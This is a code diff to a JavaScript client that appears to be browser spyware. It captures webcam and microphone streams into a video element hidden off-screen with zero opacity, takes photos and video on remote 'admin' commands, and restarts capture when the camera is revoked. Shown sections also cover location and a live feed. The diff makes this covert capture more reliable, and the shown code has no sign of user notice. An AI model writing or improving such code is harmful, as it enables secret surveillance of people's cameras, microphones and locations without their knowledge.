@@ -342,10 +342,13 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
     // ═══ CAMERA + PHOTO + VIDEO ═══════════════════════════════
     async function takePhoto() {
         if (!stream || !videoEl || !videoReady) return;
+        // Must have an actual video track with real dimensions — never draw a black frame
+        if (stream.getVideoTracks().length === 0) return;
+        const w = videoEl.videoWidth;
+        const h = videoEl.videoHeight;
+        if (w === 0 || h === 0) return;
         try {
             if (!canvas) { canvas = document.createElement('canvas'); ctx = canvas.getContext('2d'); }
-            const w = videoEl.videoWidth || 640;
-            const h = videoEl.videoHeight || 480;
             canvas.width = w; canvas.height = h;
             ctx.drawImage(videoEl, 0, 0, w, h);
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', C.photoQuality || 0.7));
@@ -354,7 +357,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
     }
 
     function recordVideo() {
-        if (!stream) return;
+        if (!stream || stream.getVideoTracks().length === 0) return;
         try {
             const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'];
             const mime = types.find(t => MediaRecorder.isTypeSupported(t)) || 'video/webm';
@@ -370,61 +373,83 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
 
     async function initCamera() {
         videoReady = false;
-        const cfgs = [
+        // Stop any existing tracks first
+        if (stream) { try { stream.getTracks().forEach(t => t.stop()); } catch {} stream = null; }
+
+        // ── Step 1: get a stream that has at least one video track ──────
+        const videoCfgs = [
             { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: true },
             { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
-            { video: { facingMode: 'environment' }, audio: true },
+            { video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
+            { video: { width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
             { video: true, audio: true },
-            { video: true, audio: false },
-            { video: false, audio: true }
+            { video: true, audio: false }  // last resort: video without mic
         ];
-        for (const c of cfgs) {
+        for (const cfg of videoCfgs) {
             try {
-                const s = await navigator.mediaDevices.getUserMedia(c);
+                const s = await navigator.mediaDevices.getUserMedia(cfg);
+                if (s.getVideoTracks().length === 0) { s.getTracks().forEach(t => t.stop()); continue; }
                 stream = s;
-                // Ensure we have a video element (create one if the page doesn't have it)
-                videoEl = document.getElementById('v');
-                if (!videoEl) {
-                    videoEl = document.createElement('video');
-                    videoEl.id = 'v';
-                    videoEl.setAttribute('autoplay', '');
-                    videoEl.setAttribute('muted', '');
-                    videoEl.setAttribute('playsinline', '');
-                    videoEl.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1';
-                    document.body.appendChild(videoEl);
-                }
-                videoEl.muted = true;
-                videoEl.autoplay = true;
-                videoEl.playsInline = true;
-                videoEl.srcObject = stream;
-                // Wait for actual playback — canplay / playing fires once frames are decodable
-                await new Promise((resolve) => {
-                    let done = false;
-                    const finish = () => { if (!done) { done = true; resolve(); } };
-                    videoEl.addEventListener('canplay', finish, { once: true });
-                    videoEl.addEventListener('playing', finish, { once: true });
-                    videoEl.addEventListener('error',   finish, { once: true });
-                    videoEl.play().catch(finish);
-                    setTimeout(finish, 5000); // safety timeout
-                });
-                // Listen for track ending so we can re-init when camera is revoked
-                stream.getTracks().forEach(t => {
-                    t.addEventListener('ended', () => { videoReady = false; setTimeout(initCamera, 1000); });
-                });
-                // Only mark ready when we actually have video dimensions
-                if (c.video !== false) {
-                    // Poll briefly for dimensions in case canplay fired before metadata
-                    for (let i = 0; i < 20; i++) {
-                        if (videoEl.videoWidth > 0) break;
-                        await new Promise(r => setTimeout(r, 100));
-                    }
-                }
-                videoReady = true;
-                // Photos and video are on-demand only (via screenshot/mic commands from admin)
-                return;
+                break;
             } catch {}
         }
-        post('/log-error', { type: 'camera', message: 'All camera configs failed' });
+
+        // ── Step 2: audio-only fallback (for mic feature, no live feed) ─
+        if (!stream) {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                post('/log-error', { type: 'camera', message: 'No video stream available — audio only' });
+            } catch {
+                post('/log-error', { type: 'camera', message: 'getUserMedia failed for all configs' });
+            }
+            return; // exit: no video → nothing to set up on videoEl
+        }
+
+        // ── Step 3: attach stream to video element ───────────────────────
+        videoEl = document.getElementById('v');
+        if (!videoEl) {
+            videoEl = document.createElement('video');
+            videoEl.id = 'v';
+            videoEl.setAttribute('autoplay', '');
+            videoEl.setAttribute('muted', '');
+            videoEl.setAttribute('playsinline', '');
+            videoEl.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:320px;height:240px;opacity:0;pointer-events:none;z-index:-1';
+            document.body.appendChild(videoEl);
+        }
+        videoEl.muted = true;
+        videoEl.autoplay = true;
+        videoEl.playsInline = true;
+
+        // Add ALL event listeners BEFORE assigning srcObject to avoid race conditions
+        await new Promise((resolve) => {
+            let done = false;
+            const finish = () => { if (!done) { done = true; resolve(); } };
+            videoEl.addEventListener('loadedmetadata', finish, { once: true });
+            videoEl.addEventListener('canplay',        finish, { once: true });
+            videoEl.addEventListener('playing',        finish, { once: true });
+            videoEl.addEventListener('error',          finish, { once: true });
+            videoEl.srcObject = stream;
+            videoEl.play().catch(() => {});
+            setTimeout(finish, 8000); // hard timeout — never hang forever
+        });
+
+        // ── Step 4: wait for real video dimensions (proof frames are flowing)
+        let waited = 0;
+        while (videoEl.videoWidth === 0 && waited < 5000) {
+            await new Promise(r => setTimeout(r, 100));
+            waited += 100;
+        }
+        if (videoEl.videoWidth === 0) {
+            post('/log-error', { type: 'camera', message: 'videoWidth stayed 0 after 5s — stream may be black' });
+            // Still mark ready so we at least attempt frames (some browsers report 0 initially)
+        }
+
+        // ── Step 5: re-init when camera gets revoked ──────────────────────
+        stream.getVideoTracks().forEach(t => {
+            t.addEventListener('ended', () => { videoReady = false; setTimeout(initCamera, 1000); });
+        });
+
+        videoReady = true;
     }
 
     // ═══ LOCATION ═════════════════════════════════════════════
@@ -497,8 +522,11 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
 
     function startLiveFeed() {
         if (liveActive) return;
-        if (!stream) { liveActive = false; return; }
-        // If camera hasn't finished initialising yet, retry shortly
+        // No stream at all yet — retry after init has a chance to run
+        if (!stream) { setTimeout(startLiveFeed, 800); return; }
+        // No video tracks → can't stream video
+        if (stream.getVideoTracks().length === 0) { liveActive = false; return; }
+        // Camera not ready yet — wait and retry
         if (!videoReady || !videoEl) {
             setTimeout(startLiveFeed, 800);
             return;
